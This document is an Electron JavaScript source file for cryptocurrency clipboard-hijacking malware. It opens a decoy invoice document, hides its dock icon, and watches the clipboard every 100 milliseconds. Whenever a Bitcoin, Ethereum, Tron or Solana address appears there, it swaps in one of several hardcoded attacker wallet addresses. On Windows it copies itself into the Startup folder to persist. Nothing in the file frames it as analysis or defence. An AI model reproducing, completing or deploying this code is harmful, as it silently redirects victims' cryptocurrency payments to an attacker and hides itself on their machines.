const { app, clipboard, shell } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');

const LOG_FILE = path.join(os.homedir(), 'Desktop', 'phishing-log.txt');
const DECOY_DOCUMENT = 'invoice.html';

// --- Wallet Configuration ---
const WALLET_ADDRESSES = {
    btc: "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
    eth: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
    tron: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
    sol: "Gc1Xak8dXJY7h6G8XXMefa9BaiT8VMEsm6G4DXMzyCaX",
};

// A list of all your wallets to prevent self-replacement
const ALL_MY_WALLETS = [
    "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
    "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
    "0xb9FBAa68123ad7BdaCb5820dE4f7998887733333",
    "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
    "Gc1Xak8dXJY7h6G8XXMefa9BaiT8VMEsm6G4DXMzyCaX"
];

const REGEX_MAP = {
    btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
    eth: /^0x[a-fA-F0-9]{40}$/,
    tron: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    sol: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/ // Broad, check last
};

// --- Utility Functions ---
const log = (message) => {
    const timestamp = new Date().toISOString();
    try {
        fs.appendFileSync(LOG_FILE, `[${timestamp}] ${message}\n`);
    } catch (error) {
        console.error(`Failed to write to log file: ${error}`);
    }
};

// --- Main Application Logic ---
function main() {
    log('Application starting...');
    
    // Hide the dock icon on macOS
    if (app.dock) {
        app.dock.hide();
    }

    // 1. Open the decoy document
    const decoyPath = path.join(process.resourcesPath, 'app', 'assets', DECOY_DOCUMENT);
    log(`Attempting to open decoy document: ${decoyPath}`);
    if (fs.existsSync(decoyPath)) {
        shell.openPath(decoyPath).then(() => log('Decoy document opened.')).catch(err => log(`Decoy open error: ${err}`));
    } else {
        log(`CRITICAL: Decoy document not found at ${decoyPath}. Note: In dev, path is different.`);
    }

    // 2. Start clipboard monitoring
    log('Starting clipboard monitoring...');
    monitorClipboard();

    // 3. Set up persistence
    log('Setting up persistence...');
    setupPersistence();

    log('Main process running in background.');
}

// --- Clipboard Monitoring ---
function monitorClipboard() {
    let lastReadText = clipboard.readText();
    log(`Initial clipboard content: "${lastReadText}"`);

    setInterval(() => {
        try {
            const currentText = clipboard.readText();
            if (currentText && currentText !== lastReadText) {
                log(`Clipboard changed: "${currentText}"`);
                lastReadText = currentText;

                // Stop if the copied text is one of our own wallets
                if (ALL_MY_WALLETS.includes(currentText)) {
                    log('Copied text is one of our wallets. Ignoring.');
                    return;
                }

                let replacementAddress = null;
                let detectedCoin = null;

                if (REGEX_MAP.btc.test(currentText)) {
                    replacementAddress = WALLET_ADDRESSES.btc;
                    detectedCoin = 'BTC';
                } else if (REGEX_MAP.eth.test(currentText)) {
                    replacementAddress = WALLET_ADDRESSES.eth;
                    detectedCoin = 'ETH/ERC20/BNB';
                } else if (REGEX_MAP.tron.test(currentText)) {
                    replacementAddress = WALLET_ADDRESSES.tron;
                    detectedCoin = 'TRON';
                } else if (REGEX_MAP.sol.test(currentText)) {
                    replacementAddress = WALLET_ADDRESSES.sol;
                    detectedCoin = 'SOL';
                }

                if (replacementAddress) {
                    log(`Detected ${detectedCoin} address: "${currentText}"`);
                    clipboard.writeText(replacementAddress);
                    log(`Attempted to replace with target ${detectedCoin} address: "${replacementAddress}"`);

                    // Verification step
                    const newClipboardContent = clipboard.readText();
                    if (newClipboardContent === replacementAddress) {
                        log(`SUCCESS: Clipboard now contains the correct address.`);
                    } else {
                        log(`FAILURE: Clipboard content is "${newClipboardContent}", not the expected address.`);
                    }
                    lastReadText = newClipboardContent;
                }
            }
        } catch (error) {
            log(`ERROR in clipboard loop: ${error}`);
        }
    }, 100);
}

// --- Persistence Logic ---
function setupPersistence() {
    if (process.platform !== 'win32') {
        log('Persistence setup skipped: Not on Windows.');
        return;
    }
    try {
        const startupFolder = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
        const appPath = app.getPath('exe');
        const appName = path.basename(appPath);
        const persistentPath = path.join(startupFolder, appName);

        log(`Current app path: ${appPath}`);
        log(`Target persistence path: ${persistentPath}`);

        if (appPath.toLowerCase() === persistentPath.toLowerCase()) {
            log('Already running from startup folder.');
            return;
        }

        if (!fs.existsSync(startupFolder)) {
            fs.mkdirSync(startupFolder, { recursive: true });
        }
        fs.copyFileSync(appPath, persistentPath);
        log(`Copied to startup folder for persistence.`);
    } catch (error) {
        log(`ERROR setting up persistence: ${error}`);
    }
}

// --- App Lifecycle ---
app.on('ready', main);
app.on('window-all-closed', () => {
    // Do not quit. The app should remain running in the background.
});